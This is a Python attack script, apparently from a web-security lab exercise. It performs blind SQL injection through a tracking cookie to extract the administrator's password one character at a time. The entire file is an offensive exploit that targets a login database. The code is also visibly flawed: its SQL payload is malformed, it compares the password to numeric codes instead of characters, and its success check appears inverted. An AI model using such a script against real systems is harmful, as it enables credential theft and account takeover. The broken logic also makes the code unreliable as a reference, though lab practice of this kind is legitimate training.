import sys
import requests
import urllib3
import urllib


#disable warnings

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}

def sqli_password(url):
	password_extracted=""

	for i in range(1,21):
		for j in range(32,126):
			sqli_payload="'and(select ascii (username from users where username='administrator' and substring(password,%s,1)='%s'))='administrator'--" %(i,j)

			sqli_payload_encoded=urllib.parse.quote(sqli_payload)
			cookie= {"TrackingId":"OMtjejO3h2joVY9d"+ sqli_payload_encoded,"session":"5byGO3vjUzYwvbaPFTPCvH0EE1KXZXub"}
			get_request=requests.get(url,cookies=cookie,verify=False,
				proxies=proxies)
			if "Welcome" not in get_request.text:
				sys.stdout.write("\r"+password_extracted+chr(j))
				sys.stdout.flush()
			else:
				password_extracted+=chr(j)
				sys.stdout.write("\r"+password_extracted+chr(j))
				sys.stdout.flush()
				break



def main():
	if len(sys.argv)!=2:
		print("(+) Usage:%s<url>" % sys.argv[0])
		print("(+) Example:%s www.Example.com" %sys.argv[0])
	url=sys.argv[1]
	print("(+) Retrieving administrator password... ")
	sqli_password(url)



if __name__ =="__main__":
	main()
